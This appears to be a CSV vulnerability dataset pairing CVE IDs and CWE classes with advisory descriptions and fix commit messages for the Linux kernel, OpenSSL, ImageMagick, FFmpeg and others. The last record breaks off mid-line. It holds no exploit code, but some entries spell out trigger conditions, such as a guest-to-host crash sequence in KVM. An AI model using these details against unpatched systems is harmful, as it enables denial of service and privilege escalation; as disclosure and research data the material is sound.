CVE-2017-1000380,CWE-200,2017-06-17,"sound/core/timer.c in the Linux kernel before 4.11.5 is vulnerable to a data race in the ALSA /dev/snd/timer driver resulting in local users being able to read information belonging to other users, i.e., uninitialized memory contents may be disclosed when a read and an ioctl happen at the same time.","snd_timer_user_tselect() reallocates the queue buffer dynamically, but it forgot to reset its indices.  Since the read may happen concurrently with ioctl and snd_timer_user_tselect() allocates the buffer via kmalloc(), this may lead to the leak of uninitialized kernel-space data, as spotted via KMSAN:    BUG: KMSAN: use of unitialized memory in snd_timer_user_read+0x6c4/0xa10   CPU: 0 PID: 1037 Comm: probe Not tainted 4.11.0-rc5+ #2739   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011   Call Trace:    __dump_stack lib/dump_stack.c:16    dump_stack+0x143/0x1b0 lib/dump_stack.c:52    kmsan_report+0x12a/0x180 mm/kmsan/kmsan.c:1007    kmsan_check_memory+0xc2/0x140 mm/kmsan/kmsan.c:1086    copy_to_user ./arch/x86/include/asm/uaccess.h:725    snd_timer_user_read+0x6c4/0xa10 sound/core/timer.c:2004    do_loop_readv_writev fs/read_write.c:716    __do_readv_writev+0x94c/0x1380 fs/read_write.c:864    do_readv_writev fs/read_write.c:894    vfs_readv fs/read_write.c:908    do_readv+0x52a/0x5d0 fs/read_write.c:934    SYSC_readv+0xb6/0xd0 fs/read_write.c:1021    SyS_readv+0x87/0xb0 fs/read_write.c:1018  This patch adds the missing reset of queue indices.  Together with the previous fix for the ioctl/read race, we cover the whole problem.  Reported-by: Alexander Potapenko <glider@google.com> Tested-by: Alexander Potapenko <glider@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2016-2177,CWE-190,2016-06-20,"OpenSSL through 1.0.2h incorrectly uses pointer arithmetic for heap-buffer boundary checks, which might allow remote attackers to cause a denial of service (integer overflow and application crash) or possibly have unspecified other impact by leveraging unexpected malloc behavior, related to s3_srvr.c, ssl_sess.c, and t1_lib.c.",
CVE-2016-10065,CWE-284,2017-03-03,The ReadVIFFImage function in coders/viff.c in ImageMagick before 7.0.1-0 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2018-15836,CWE-347,2018-09-26,"In verify_signed_hash() in lib/liboswkeys/signatures.c in Openswan before 2.6.50.1, the RSA implementation does not verify the value of padding string during PKCS#1 v1.5 signature verification. Consequently, a remote attacker can forge signatures when small public exponents are being used. IKEv2 signature verification is affected when RAW RSA keys are used.",Special thanks to Sze Yiu Chau of Purdue University (schau@purdue.edu) who reported the issue.
CVE-2017-13034,CWE-125,2017-09-14,The PGM parser in tcpdump before 4.9.2 has a buffer over-read in print-pgm.c:pgm_print().,"This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s), modified so the capture file won't be rejected as an invalid capture.  Move a return to make the code a bit cleaner (i.e., make it more obvious that if we don't have enough of the PGM header, we just print the source and destination IP addresses, mark it as incomplete PGM, and don't try to look at the PGM header)."
CVE-2018-8786,CWE-680,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains an Integer Truncation that leads to a Heap-Based Buffer Overflow in function update_read_bitmap_update() and results in a memory corruption and probably even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2016-6213,CWE-400,2016-12-28,"fs/namespace.c in the Linux kernel before 4.9 does not restrict how many mounts may exist in a mount namespace, which allows local users to cause a denial of service (memory consumption and deadlock) via MS_BIND mount system calls, as demonstrated by a loop that triggers exponential growth in the number of mounts.",
CVE-2016-1583,CWE-119,2016-06-27,"The ecryptfs_privileged_open function in fs/ecryptfs/kthread.c in the Linux kernel before 4.6.3 allows local users to gain privileges or cause a denial of service (stack memory consumption) via vectors involving crafted mmap calls for /proc pathnames, leading to recursive pagefault handling.",This prevents users from triggering a stack overflow through a recursive invocation of pagefault handling that involves mapping procfs files into virtual memory.  Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Tyler Hicks <tyhicks@canonical.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2018-0732,CWE-320,2018-06-12,During key agreement in a TLS handshake using a DH(E) based ciphersuite a malicious server can send a very large prime value to the client. This will cause the client to spend an unreasonably long period of time generating a key for this prime resulting in a hang until the client has finished. This could be exploited in a Denial Of Service attack. Fixed in OpenSSL 1.1.0i-dev (Affected 1.1.0-1.1.0h). Fixed in OpenSSL 1.0.2p-dev (Affected 1.0.2-1.0.2o).,
CVE-2018-20836,CWE-362,2019-05-07,"An issue was discovered in the Linux kernel before 4.20. There is a race condition in smp_task_timedout() and smp_task_done() in drivers/scsi/libsas/sas_expander.c, leading to a use-after-free.","When the lldd is processing the complete sas task in interrupt and set the task stat as SAS_TASK_STATE_DONE, the smp timeout timer is able to be triggered at the same time. And smp_task_timedout() will complete the task wheter the SAS_TASK_STATE_DONE is set or not. Then the sas task may freed before lldd end the interrupt process. Thus a use-after-free will happen.  Fix this by calling the complete() only when SAS_TASK_STATE_DONE is not set. And remove the check of the return value of the del_timer(). Once the LLDD sets DONE, it must call task->done(), which will call smp_task_done()->complete() and the task will be completed and freed correctly.  Reported-by: chenxiang <chenxiang66@hisilicon.com> Signed-off-by: Jason Yan <yanaijie@huawei.com> CC: John Garry <john.garry@huawei.com> CC: Johannes Thumshirn <jthumshirn@suse.de> CC: Ewan Milne <emilne@redhat.com> CC: Christoph Hellwig <hch@lst.de> CC: Tomas Henzl <thenzl@redhat.com> CC: Dan Williams <dan.j.williams@intel.com> CC: Hannes Reinecke <hare@suse.com> Reviewed-by: Hannes Reinecke <hare@suse.com> Reviewed-by: John Garry <john.garry@huawei.com> Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de> Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>"
CVE-2017-14223,CWE-400,2017-09-09,"In libavformat/asfdec_f.c in FFmpeg 3.3.3, a DoS in asf_build_simple_index() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted ASF file, which claims a large ""ict"" field in the header but does not contain sufficient backing data, is provided, the for loop would consume huge CPU and memory resources, since there is no EOF check inside the loop.",Fixes: Missing EOF check in loop No testcase  Found-by: Xiaohei and Wangchu from Alibaba Security Team Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2014-9717,CWE-284,2016-05-02,"fs/namespace.c in the Linux kernel before 4.0.2 processes MNT_DETACH umount2 system calls without verifying that the MNT_LOCKED flag is unset, which allows local users to bypass intended access restrictions and navigate to filesystem locations beneath a mount by calling umount2 within a user namespace.","Modify umount(MNT_DETACH) to keep mounts in the hash table that are locked to their parent mounts, when the parent is lazily unmounted.  In mntput_no_expire detach the children from the hash table, depending on mnt_pin_kill in cleanup_mnt to decrement the mnt_count of the children.  In __detach_mounts if there are any mounts that have been unmounted but still are on the list of mounts of a mountpoint, remove their children from the mount hash table and those children to the unmounted list so they won't linger potentially indefinitely waiting for their final mntput, now that the mounts serve no purpose.  Cc: stable@vger.kernel.org Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com>"
CVE-2018-18690,CWE-754,2018-10-26,"In the Linux kernel before 4.17, a local attacker able to set attributes on an xfs filesystem could make this filesystem non-operational until the next mount by triggering an unchecked error condition during an xfs attribute change, because xfs_attr_shortform_addname in fs/xfs/libxfs/xfs_attr.c mishandles ATTR_REPLACE operations with conversion of an attr from short to long form.","Kanda Motohiro reported that expanding a tiny xattr into a large xattr fails on XFS because we remove the tiny xattr from a shortform fork and then try to re-add it after converting the fork to extents format having not removed the ATTR_REPLACE flag.  This fails because the attr is no longer present, causing a fs shutdown.  This is derived from the patch in his bug report, but we really shouldn't ignore a nonzero retval from the remove call.  Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=199119 Reported-by: kanda.motohiro@gmail.com Reviewed-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Christoph Hellwig <hch@lst.de> Signed-off-by: Darrick J. Wong <darrick.wong@oracle.com>"
CVE-2012-6701,CWE-190,2016-05-02,Integer overflow in fs/aio.c in the Linux kernel before 3.4.1 allows local users to cause a denial of service or possibly have unspecified other impact via a large AIO iovec.,"We had for some reason overlooked the AIO interface, and it didn't use the proper rw_verify_area() helper function that checks (for example) mandatory locking on the file, and that the size of the access doesn't cause us to overflow the provided offset limits etc.  Instead, AIO did just the security_file_permission() thing (that rw_verify_area() also does) directly.  This fixes it to do all the proper helper functions, which not only means that now mandatory file locking works with AIO too, we can actually remove lines of code.  Reported-by: Manish Honap <manish_honap_vit@yahoo.co.in> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2015-6526,CWE-399,2015-08-31,The perf_callchain_user_64 function in arch/powerpc/perf/callchain.c in the Linux kernel before 4.0.2 on ppc64 platforms allows local users to cause a denial of service (infinite loop) via a deep 64-bit userspace backtrace.,"We cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH (currently 127), but we forgot to do the same for 64bit backtraces.  Cc: stable@vger.kernel.org Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>"
CVE-2016-6187,CWE-119,2016-08-06,"The apparmor_setprocattr function in security/apparmor/lsm.c in the Linux kernel before 4.6.5 does not validate the buffer size, which allows local users to gain privileges by triggering an AppArmor setprocattr hook.","When proc_pid_attr_write() was changed to use memdup_user apparmor's (interface violating) assumption that the setprocattr buffer was always a single page was violated.  The size test is not strictly speaking needed as proc_pid_attr_write() will reject anything larger, but for the sake of robustness we can keep it in.  SMACK and SELinux look safe to me, but somebody else should probably have a look just in case.  Based on original patch from Vegard Nossum <vegard.nossum@oracle.com> modified for the case that apparmor provides null termination.  Fixes: bb646cd Reported-by: Vegard Nossum <vegard.nossum@oracle.com> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: John Johansen <john.johansen@canonical.com> Cc: Paul Moore <paul@paul-moore.com> Cc: Stephen Smalley <sds@tycho.nsa.gov> Cc: Eric Paris <eparis@parisplace.org> Cc: Casey Schaufler <casey@schaufler-ca.com> Cc: stable@kernel.org Signed-off-by: John Johansen <john.johansen@canonical.com> Reviewed-by: Tyler Hicks <tyhicks@canonical.com> Signed-off-by: James Morris <james.l.morris@oracle.com>"
CVE-2015-3212,CWE-362,2015-08-31,"Race condition in net/sctp/socket.c in the Linux kernel before 4.1.2 allows local users to cause a denial of service (list corruption and panic) via a rapid series of system calls related to sockets, as demonstrated by setsockopt calls.","->auto_asconf_splist is per namespace and mangled by functions like sctp_setsockopt_auto_asconf() which doesn't guarantee any serialization.  Also, the call to inet_sk_copy_descendant() was backuping ->auto_asconf_list through the copy but was not honoring ->do_auto_asconf, which could lead to list corruption if it was different between both sockets.  This commit thus fixes the list handling by using ->addr_wq_lock spinlock to protect the list. A special handling is done upon socket creation and destruction for that. Error handlig on sctp_init_sock() will never return an error after having initialized asconf, so sctp_destroy_sock() can be called without addrq_wq_lock. The lock now will be take on sctp_close_sock(), before locking the socket, so we don't do it in inverse order compared to sctp_addr_wq_timeout_handler().  Instead of taking the lock on sctp_sock_migrate() for copying and restoring the list values, it's preferred to avoid rewritting it by implementing sctp_copy_descendant().  Issue was found with a test application that kept flipping sysctl default_auto_asconf on and off, but one could trigger it by issuing simultaneous setsockopt() calls on multiple sockets or by creating/destroying sockets fast enough. This is only triggerable locally.  Fixes: 9f7d653 (""sctp: Add Auto-ASCONF support (core)."") Reported-by: Ji Jianwen <jiji@redhat.com> Suggested-by: Neil Horman <nhorman@tuxdriver.com> Suggested-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2019-17178,CWE-252,2019-10-04,"HuffmanTree_makeFromFrequencies in lodepng.c in LodePNG through 2019-09-28, as used in WinPR in FreeRDP and other products, has a memory leak because a supplied realloc pointer (i.e., the first argument to realloc) is also used for a realloc return value.",
CVE-2018-14359,CWE-120,2018-07-17,An issue was discovered in Mutt before 1.10.1 and NeoMutt before 2018-07-16. They have a buffer overflow via base64 data.,"The obuf can be overflowed in auth_cram.c, and possibly auth_gss.c.  Thanks to Jeriko One for the bug report."
CVE-2013-4247,CWE-189,2013-08-25,Off-by-one error in the build_unc_path_to_root function in fs/cifs/connect.c in the Linux kernel before 3.9.6 allows remote attackers to cause a denial of service (memory corruption and system crash) via a DFS share mount operation that triggers use of an unexpected DFS referral name length.,"commit 839db3d (cifs: fix up handling of prefixpath= option) changed the code such that the vol->prepath no longer contained a leading delimiter and then fixed up the places that accessed that field to account for that change.  One spot in build_unc_path_to_root was missed however. When doing the pointer addition on pos, that patch failed to account for the fact that we had already incremented ""pos"" by one when adding the length of the prepath. This caused a buffer overrun by one byte.  This patch fixes the problem by correcting the handling of ""pos"".  Cc: <stable@vger.kernel.org> # v3.8+ Reported-by: Marcus Moeller <marcus.moeller@gmx.ch> Reported-by: Ken Fallon <ken.fallon@gmail.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <sfrench@us.ibm.com>"
CVE-2011-1479,CWE-399,2012-06-21,Double free vulnerability in the inotify subsystem in the Linux kernel before 2.6.39 allows local users to cause a denial of service (system crash) via vectors involving failed attempts to create files.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2010-4250.,"On an error path in inotify_init1 a normal user can trigger a double free of struct user.  This is a regression introduced by a2ae4cc (""inotify: stop kernel memory leak on file creation failure"").  We fix this by making sure that if a group exists the user reference is dropped when the group is cleaned up.  We should not explictly drop the reference on error and also drop the reference when the group is cleaned up.  The new lifetime rules are that an inotify group lives from inotify_new_group to the last fsnotify_put_group.  Since the struct user and inotify_devs are directly tied to this lifetime they are only changed/updated in those two locations.  We get rid of all special casing of struct user or user->inotify_devs.  Signed-off-by: Eric Paris <eparis@redhat.com> Cc: stable@kernel.org (2.6.37 and up) Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-7946,CWE-416,2017-04-18,The get_relocs_64 function in libr/bin/format/mach0/mach0.c in radare2 1.3.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted Mach0 file.,
CVE-2017-12662,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WritePDFImage in coders/pdf.c.,
CVE-2013-6367,CWE-189,2013-12-14,The apic_get_tmcct function in arch/x86/kvm/lapic.c in the KVM subsystem in the Linux kernel through 3.12.5 allows guest OS users to cause a denial of service (divide-by-zero error and host OS crash) via crafted modifications of the TMICT value.,"Under guest controllable circumstances apic_get_tmcct will execute a divide by zero and cause a crash.  If the guest cpuid support tsc deadline timers and performs the following sequence of requests the host will crash. - Set the mode to periodic - Set the TMICT to 0 - Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline) - Set the TMICT to non-zero. Then the lapic_timer.period will be 0, but the TMICT will not be.  If the guest then reads from the TMCCT then the host will perform a divide by 0.  This patch ensures that if the lapic_timer.period is 0, then the division does not occur.  Reported-by: Andrew Honig <ahonig@google.com> Cc: stable@vger.kernel.org Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2013-7013,CWE-189,2013-12-09,"The g2m_init_buffers function in libavcodec/g2meet.c in FFmpeg before 2.1 uses an incorrect ordering of arithmetic operations, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.",Fixes out of array accesses Fixes Ticket2922  Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2011-2905,,2013-03-01,"Untrusted search path vulnerability in the perf_config function in tools/perf/util/config.c in perf, as distributed in the Linux kernel before 3.1, allows local users to overwrite arbitrary files via a crafted config file in the current working directory.","In addition to /etc/perfconfig and $HOME/.perfconfig, perf looks for configuration in the file ./config, imitating git which looks at $GIT_DIR/config.  If ./config is not a perf configuration file, it fails, or worse, treats it as a configuration file and changes behavior in some unexpected way.  ""config"" is not an unusual name for a file to be lying around and perf does not have a private directory dedicated for its own use, so let's just stop looking for configuration in the cwd.  Callers needing context-sensitive configuration can use the PERF_CONFIG environment variable.  Requested-by: Christian Ohm <chr.ohm@gmx.net> Cc: 632923@bugs.debian.org Cc: Ben Hutchings <ben@decadent.org.uk> Cc: Christian Ohm <chr.ohm@gmx.net> Cc: Ingo Molnar <mingo@elte.hu> Cc: Paul Mackerras <paulus@samba.org> Cc: Peter Zijlstra <a.p.zijlstra@chello.nl> Link: http://lkml.kernel.org/r/20110805165838.GA7237@elie.gateway.2wire.net Signed-off-by: Jonathan Nieder <jrnieder@gmail.com> Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>"
CVE-2017-12843,CWE-20,2017-08-22,"Cyrus IMAP before 3.0.3 allows remote authenticated users to write to arbitrary files via a crafted (1) SYNCAPPLY, (2) SYNCGET or (3) SYNCRESTORE command.",
CVE-2015-3183,CWE-17,2015-07-20,"The chunked transfer coding implementation in the Apache HTTP Server before 2.4.14 does not properly parse chunk headers, which allows remote attackers to conduct HTTP request smuggling attacks via a crafted request, related to mishandling of large chunk-size values and invalid chunk-extension characters in modules/http/http_filters.c.",authorized characters.  Submitted by: Yann Ylavic    git-svn-id: https://svn.apache.org/repos/asf/httpd/httpd/trunk@1684513 13f79535-47bb-0310-9956-ffa450edef68
CVE-2015-1334,CWE-17,2015-08-12,"attach.c in LXC 1.1.2 and earlier uses the proc filesystem in a container, which allows local container users to escape AppArmor or SELinux confinement by mounting a proc filesystem with a crafted (1) AppArmor profile or (2) SELinux label.",A user could otherwise over-mount /proc and prevent the apparmor profile or selinux label from being written which combined with a modified /bin/sh or other commonly used binary would lead to unconfined code execution.  Reported-by: Roman Fiedler Signed-off-by: Stéphane Graber <stgraber@ubuntu.com>
CVE-2013-1796,CWE-119,2013-03-22,"The kvm_set_msr_common function in arch/x86/kvm/x86.c in the Linux kernel through 3.8.4 does not ensure a required time_page alignment during an MSR_KVM_SYSTEM_TIME operation, which allows guest OS users to cause a denial of service (buffer overflow and host OS memory corruption) or possibly have unspecified other impact via a crafted application.","If the guest sets the GPA of the time_page so that the request to update the time straddles a page then KVM will write onto an incorrect page.  The write is done byusing kmap atomic to get a pointer to the page for the time structure and then performing a memcpy to that page starting at an offset that the guest controls.  Well behaved guests always provide a 32-byte aligned address, however a malicious guest could use this to corrupt host kernel memory.  Tested: Tested against kvmclock unit test.  Signed-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>"
CVE-2017-6497,CWE-476,2017-03-06,"An issue was discovered in ImageMagick 6.9.7. A specially crafted psd file could lead to a NULL pointer dereference (thus, a DoS).",
CVE-2015-5296,CWE-20,2015-12-29,"Samba 3.x and 4.x before 4.1.22, 4.2.x before 4.2.7, and 4.3.x before 4.3.3 supports connections that are encrypted but unsigned, which allows man-in-the-middle attackers to conduct encrypted-to-unencrypted downgrade attacks by modifying the client-server data stream, related to clidfs.c, libsmb_server.c, and smbXcli_base.c.",
CVE-2013-1928,CWE-200,2013-04-29,"The do_video_set_spu_palette function in fs/compat_ioctl.c in the Linux kernel before 3.6.5 on unspecified architectures lacks a certain error check, which might allow local users to obtain sensitive information from kernel stack memory via a crafted VIDEO_SET_SPU_PALETTE ioctl call on a /dev/dvb device.",The compat ioctl for VIDEO_SET_SPU_PALETTE was missing an error check while converting ioctl arguments.  This could lead to leaking kernel stack contents into userspace.  Patch extracted from existing fix in grsecurity.  Signed-off-by: Kees Cook <keescook@chromium.org> Cc: David Miller <davem@davemloft.net> Cc: Brad Spengler <spender@grsecurity.net> Cc: PaX Team <pageexec@freemail.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2018-8897,CWE-362,2018-05-08,"A statement in the System Programming Guide of the Intel 64 and IA-32 Architectures Software Developer's Manual (SDM) was mishandled in the development of some or all operating-system kernels, resulting in unexpected behavior for #DB exceptions that are deferred by MOV SS or POP SS, as demonstrated by (for example) privilege escalation in Windows, macOS, some Xen configurations, or FreeBSD, or a Linux kernel crash. The MOV to SS and POP SS instructions inhibit interrupts (including NMIs), data breakpoints, and single step trap exceptions until the instruction boundary following the next instruction (SDM Vol. 3A; section 6.8.3). (The inhibited data breakpoints are those on memory accessed by the MOV to SS or POP to SS instruction itself.) Note that debug exceptions are not inhibited by the interrupt enable (EFLAGS.IF) system flag (SDM Vol. 3A; section 2.3). If the instruction following the MOV to SS or POP to SS instruction is an instruction like SYSCALL, SYSENTER, INT 3, etc. that transfers control to the operating system at CPL < 3, the debug exception is delivered after the transfer to CPL < 3 is complete. OS kernels may not expect this order of events and may therefore experience unexpected behavior when it occurs.","There's nothing IST-worthy about #BP/int3.  We don't allow kprobes in the small handful of places in the kernel that run at CPL0 with an invalid stack, and 32-bit kernels have used normal interrupt gates for #BP forever.  Furthermore, we don't allow kprobes in places that have usergs while in kernel mode, so ""paranoid"" is also unnecessary.  Signed-off-by: Andy Lutomirski <luto@kernel.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Signed-off-by: Thomas Gleixner <tglx@linutronix.de> Cc: stable@vger.kernel.org"
CVE-2018-1000877,CWE-415,2018-12-20,"libarchive version commit 416694915449219d505531b1096384f3237dd6cc onwards (release v3.1.0 onwards) contains a CWE-415: Double Free vulnerability in RAR decoder - libarchive/archive_read_support_format_rar.c, parse_codes(), realloc(rar->lzss.window, new_size) with new_size = 0 that can result in Crash/DoS. This attack appear to be exploitable via the victim must open a specially crafted RAR archive.",
CVE-2014-5045,CWE-59,2014-08-01,"The mountpoint_last function in fs/namei.c in the Linux kernel before 3.15.8 does not properly maintain a certain reference count during attempts to use the umount system call in conjunction with a symlink, which allows local users to cause a denial of service (memory consumption or use-after-free) or possibly have unspecified other impact via the umount program.",Currently umount on symlink blocks following umount:  /vz is separate mount  # ls /vz/ -al | grep test drwxr-xr-x.  2 root root       4096 Jul 19 01:14 testdir lrwxrwxrwx.  1 root root         11 Jul 19 01:16 testlink -> /vz/testdir # umount -l /vz/testlink umount: /vz/testlink: not mounted (expected)  # lsof /vz # umount /vz umount: /vz: device is busy. (unexpected)  In this case mountpoint_last() gets an extra refcount on path->mnt  Signed-off-by: Vasily Averin <vvs@openvz.org> Acked-by: Ian Kent <raven@themaw.net> Acked-by: Jeff Layton <jlayton@primarydata.com> Cc: stable@vger.kernel.org Signed-off-by: Christoph Hellwig <hch@lst.de>
CVE-2019-13300,CWE-787,2019-07-05,ImageMagick 7.0.8-50 Q16 has a heap-based buffer overflow at MagickCore/statistic.c in EvaluateImages because of mishandling columns.,
CVE-2016-8674,CWE-416,2017-02-15,The pdf_to_num function in pdf-object.c in MuPDF before 1.10 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted file.,
CVE-2016-1237,CWE-284,2016-06-29,"nfsd in the Linux kernel through 4.6.3 allows local users to bypass intended file-permission restrictions by setting a POSIX ACL, related to nfs2acl.c, nfs3acl.c, and nfs4acl.c.","Use set_posix_acl, which includes proper permission checks, instead of calling ->set_acl directly.  Without this anyone may be able to grant themselves permissions to a file by setting the ACL.  Lock the inode to make the new checks atomic with respect to set_acl. (Also, nfsd was the only caller of set_acl not locking the inode, so I suspect this may fix other races.)  This also simplifies the code, and ensures our ACLs are checked by posix_acl_valid.  The permission checks and the inode locking were lost with commit 4ac7249, which changed nfsd to use the set_acl inode operation directly instead of going through xattr handlers.  Reported-by: David Sinquin <david@sinquin.eu> [agreunba@redhat.com: use set_posix_acl] Fixes: 4ac7249 Cc: Christoph Hellwig <hch@infradead.org> Cc: Al Viro <viro@zeniv.linux.org.uk> Cc: stable@vger.kernel.org Signed-off-by: J. Bruce Fields <bfields@redhat.com>"
CVE-2014-9428,CWE-399,2015-01-02,"The batadv_frag_merge_packets function in net/batman-adv/fragmentation.c in the B.A.T.M.A.N. implementation in the Linux kernel through 3.18.1 uses an incorrect length field during a calculation of an amount of memory, which allows remote attackers to cause a denial of service (mesh-node system crash) via fragmented packets.","The fragmentation code was replaced in 610bfc6 (""batman-adv: Receive fragmented packets and merge""). The new code provided a mostly unused parameter skb for the merging function. It is used inside the function to calculate the additionally needed skb tailroom. But instead of increasing its own tailroom, it is only increasing the tailroom of the first queued skb. This is not correct in some situations because the first queued entry can be a different one than the parameter.  An observed problem was:  1. packet with size 104, total_size 1464, fragno 1 was received    - packet is queued 2. packet with size 1400, total_size 1464, fragno 0 was received    - packet is queued at the end of the list 3. enough data was received and can be given to the merge function    (1464 == (1400 - 20) + (104 - 20))    - merge functions gets 1400 byte large packet as skb argument 4. merge function gets first entry in queue (104 byte)    - stored as skb_out 5. merge function calculates the required extra tail as total_size - skb->len    - pskb_expand_head tail of skb_out with 64 bytes 6. merge function tries to squeeze the extra 1380 bytes from the second queued    skb (1400 byte aka skb parameter) in the 64 extra tail bytes of skb_out  Instead calculate the extra required tail bytes for skb_out also using skb_out instead of using the parameter skb. The skb parameter is only used to get the total_size from the last received packet. This is also the total_size used to decide that all fragments were received.  Reported-by: Philipp Psurek <philipp.psurek@gmail.com> Signed-off-by: Sven Eckelmann <sven@narfation.org> Acked-by: Martin Hundebøll <martin@hundeboll.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2018-11219,CWE-190,2018-06-17,"An Integer Overflow issue was discovered in the struct library in the Lua subsystem in Redis before 3.2.12, 4.x before 4.0.10, and 5.x before 5.0 RC2, leading to a failure of bounds checking.","During an auditing Apple found that the ""struct"" Lua package we ship with Redis (http://www.inf.puc-rio.br/~roberto/struct/) contains a security problem. A bound-checking statement fails because of integer overflow. The bug exists since we initially integrated this package with Lua, when scripting was introduced, so every version of Redis with EVAL/EVALSHA capabilities exposed is affected.  Instead of just fixing the bug, the library was updated to the latest version shipped by the author."
CVE-2016-10057,CWE-119,2017-03-23,Buffer overflow in the WriteGROUP4Image function in coders/tiff.c in ImageMagick before 6.9.5-8 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2018-19045,CWE-200,2018-11-08,"keepalived 2.0.8 used mode 0666 when creating new temporary files upon a call to PrintData or PrintStats, potentially leaking sensitive information.","Commit c6247a9 - ""Add command line and configuration option to set umask"" introduced a compile warning, although the code would have worked OK.  Signed-off-by: Quentin Armitage <quentin@armitage.org.uk>"
CVE-2019-5827,CWE-190,2019-06-27,Integer overflow in SQLite via WebSQL in Google Chrome prior to 74.0.3729.131 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.,
CVE-2011-2491,CWE-400,2013-03-01,The Network Lock Manager (NLM) protocol implementation in the NFS client functionality in the Linux kernel before 3.0 allows local users to cause a denial of service (system hang) via a LOCK_UN flock system call.,"If the NLM daemon is killed on the NFS server, we can currently end up hanging forever on an 'unlock' request, instead of aborting. Basically, if the rpcbind request fails, or the server keeps returning garbage, we really want to quit instead of retrying.  Tested-by: Vasily Averin <vvs@sw.ru> Signed-off-by: Trond Myklebust <Trond.Myklebust@netapp.com> Cc: stable@kernel.org"
CVE-2014-0224,CWE-326,2014-06-05,"OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h does not properly restrict processing of ChangeCipherSpec messages, which allows man-in-the-middle attackers to trigger use of a zero-length master key in certain OpenSSL-to-OpenSSL communications, and consequently hijack sessions or obtain sensitive information, via a crafted TLS handshake, aka the ""CCS Injection"" vulnerability.",
CVE-2016-2324,CWE-119,2016-04-08,"Integer overflow in Git before 2.7.4 allows remote attackers to execute arbitrary code via a (1) long filename or (2) many nested trees, which triggers a heap-based buffer overflow.","When we find a blob at ""a/b/c"", we currently pass this to our show_object_fn callbacks as two components: ""a/b/"" and ""c"". Callbacks which want the full value then call path_name(), which concatenates the two. But this is an inefficient interface; the path is a strbuf, and we could simply append ""c"" to it temporarily, then roll back the length, without creating a new copy.  So we could improve this by teaching the callsites of path_name() this trick (and there are only 3). But we can also notice that no callback actually cares about the broken-down representation, and simply pass each callback the full path ""a/b/c"" as a string. The callback code becomes even simpler, then, as we do not have to worry about freeing an allocated buffer, nor rolling back our modification to the strbuf.  This is theoretically less efficient, as some callbacks would not bother to format the final path component. But in practice this is not measurable. Since we use the same strbuf over and over, our work to grow it is amortized, and we really only pay to memcpy a few bytes.  Signed-off-by: Jeff King <peff@peff.net> Signed-off-by: Junio C Hamano <gitster@pobox.com>"
CVE-2017-6001,CWE-362,2017-02-18,Race condition in kernel/events/core.c in the Linux kernel before 4.9.7 allows local users to gain privileges via a crafted application that makes concurrent perf_event_open system calls for moving a software group into a hardware context.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-6786.,"Di Shen reported a race between two concurrent sys_perf_event_open() calls where both try and move the same pre-existing software group into a hardware context.  The problem is exactly that described in commit:    f63a8da (""perf: Fix event->ctx locking"")  ... where, while we wait for a ctx->mutex acquisition, the event->ctx relation can have changed under us.  That very same commit failed to recognise sys_perf_event_context() as an external access vector to the events and thereby didn't apply the established locking rules correctly.  So while one sys_perf_event_open() call is stuck waiting on mutex_lock_double(), the other (which owns said locks) moves the group about. So by the time the former sys_perf_event_open() acquires the locks, the context we've acquired is stale (and possibly dead).  Apply the established locking rules as per perf_event_ctx_lock_nested() to the mutex_lock_double() for the 'move_group' case. This obviously means we need to validate state after we acquire the locks.  Reported-by: Di Shen (Keen Lab) Tested-by: John Dias <joaodias@google.com> Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org> Cc: Alexander Shishkin <alexander.shishkin@linux.intel.com> Cc: Arnaldo Carvalho de Melo <acme@kernel.org> Cc: Arnaldo Carvalho 